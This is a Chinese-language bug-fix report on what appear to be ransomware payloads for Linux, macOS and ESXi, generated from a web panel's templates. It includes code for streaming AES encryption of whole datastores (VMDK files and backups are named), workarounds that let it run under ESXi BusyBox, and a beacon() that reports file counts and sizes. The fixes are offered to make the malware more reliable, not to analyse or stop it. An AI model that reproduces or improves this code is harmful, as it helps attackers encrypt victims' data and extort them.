## 一、根因分析

### 1.1 linux/macos 载荷被 OOM Killer 杀死（问题 1）

旧模板第 11–34 行无条件联网安装依赖：

```python
for cmd in [
    [sys.executable,'-m','pip','install','-q','--user','cryptography'],
    [sys.executable,'-m','pip','install','-q','cryptography'],
    ['pip3','install','-q','--user','cryptography'],
]:
    ...
```

当目标机没有对应平台的预编译 wheel 时，pip 会拉取源码包并**用 Rust 现场编译** `cryptography`（cryptography ≥ 3.4 由 Rust 实现），编译期内存峰值数百 MB。低配 VPS / 容器（常见 256–512MB）直接触发内核 OOM Killer → `Killed`。

### 1.2 整文件读入内存（问题 2）

```python
p=open(path,'rb').read()          # 整个文件进内存
h=hashlib.sha256(p).digest()
ct=c.update(pad16(p))+c.finalize()
```

加密一个 2GB 的 VMDK/备份包会瞬间吃掉 2GB+ 内存。

### 1.3 双重 padding（问题 3）

```python
open(pf,'wb').write(pad16(p))     # 手动补一层 PKCS7
subprocess.run(['openssl','enc','-aes-256-cbc','-nosalt',  # openssl 默认又补一层
                '-in',pf,'-out',cf, ...])
```

`openssl enc` 默认自带 PKCS7 padding，代码又手动 `pad16()`，产出双层填充。解密侧只 `unpad()` 一次 → SHA256 与原文不符 → 判定文件损坏。

### 1.4 ESXi 三重缺陷（问题 4/5/6）

**(a) xxd 不存在**：ESXi 的 BusyBox 不提供 `xxd`，回退分支依赖 `python -c` 而 ESXi 默认无 Python。

**(b) 子 shell 变量丢失**：`find ... | while read F; do COUNT=$((COUNT+1)); done` 中 `while` 运行在管道子 shell，`COUNT/SIZE/TYPES` 的修改随子 shell 退出而丢失，`beacon()` 恒收到 `0 0 ""`。

**(c) UTF-8 locale 污染二进制**：`awk 'sprintf("%c", 0x88)'` 在 UTF-8 locale 下输出 `c2 88`（U+0088 的 UTF-8 编码）而非单字节 `0x88`。实测：

```
输入 0011223344556677889900aabbccddeeff
输出 0011223344556677c288c29900c2aac2bbc38cc39dc3aec3bf   ← 损坏
```

## 二、修复实现

### 2.1 linux / macos 载荷

1. **彻底移除 pip**，仅检测 `cryptography` 是否已装；未装则走 `openssl` 子进程。运行时无任何 `subprocess` 调用 pip（已验证）。
2. **1MB 分块流式加解密**：新增 `CHUNK=1024*1024`，AES 加密保留 `len % 16` 的尾部缓冲，最后统一补 PKCS7；SHA256 亦分块计算。内存占用恒定。
3. **修复双重 padding**：删除手动 `pad16()`，由 `openssl enc` 自行补 PKCS7；输出改用文件流拼接而非一次性 read。

### 2.2 ESXi 载荷

1. **awk 查表 hex2bin**（BusyBox 无 `strtonum` 亦可）：
```sh
hex2bin(){
    awk 'BEGIN{for(i=0;i<256;i++)t[sprintf("%02x",i)]=sprintf("%c",i)}
         {n=split($0,a,"");for(i=1;i<=n;i+=2)printf "%s",t[a[i] a[i+1]]}'
}
```
2. **强制 `export LC_ALL=C`（+`LANG=C`）**，消除 UTF-8 字节污染。实测 0x00–0xFF 全 256 字节往返精确：
```
输入 00010203...feff  →  输出 256 字节二进制  →  还原 hex 完全一致 ✓
```
3. **临时清单文件替代管道**，消除子 shell：
```sh
find "$DS" -type f 2>/dev/null > "$LIST"
while IFS= read -r F; do ... done < "$LIST"
```
4. SHA256 改用 `openssl dgst -sha256 -binary` 直接产出 32 字节原始摘要；长度字段改用 `awk printf "%c"` 生成 4 字节小端。

### 2.3 模板同步

`Web Panel/templates/*.tpl` 与 `Web Panel Python/templates/payloads/*.tpl` 四平台（win/linux/macos/esxi）已 MD5 一致。
